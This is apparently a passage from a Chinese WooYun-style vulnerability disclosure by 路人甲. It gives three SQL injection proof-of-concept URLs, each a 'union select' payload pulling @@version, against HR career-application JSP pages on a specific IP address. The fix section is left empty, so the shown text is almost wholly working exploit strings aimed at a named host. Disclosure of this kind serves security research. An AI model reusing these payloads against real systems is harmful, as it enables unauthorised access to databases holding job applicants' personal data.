还有   漏洞证明：  还有http://60.10.8.227:88/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7http://60.10.8.227:88/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6http://60.10.8.227:88/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,6   修复方案：     版权声明：转载请注明来源 路人甲@乌云
